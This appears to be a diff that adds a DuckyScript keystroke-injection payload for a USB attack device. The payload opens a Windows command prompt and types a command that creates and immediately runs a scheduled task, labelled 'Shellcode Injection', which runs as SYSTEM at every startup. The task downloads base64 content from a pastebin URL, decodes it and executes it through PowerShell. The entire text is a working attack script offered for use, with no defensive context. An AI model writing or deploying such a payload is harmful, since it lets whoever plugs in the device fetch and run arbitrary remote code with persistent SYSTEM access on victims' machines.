@@ -1,0 +1,10 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+DELAY 500
+ENTER
+DELAY 500
+STRING schtasks /create /tn 'Shellcode Injection' /tr 'powershell -nop -c (New-Object System.Net.WebClient).DownloadString(''https://pastebin.com/raw/{PASTEBIN_SHELLCODE_ID}'') | powershell.exe -nop -c (gc -Encoding ASCII | % {[Convert]::FromBase64String($_)}) | iex' /sc onstart /ru System /rp SYSTEM & schtasks /run /tn 'Shellcode Injection'
+DELAY 500
+ENTER
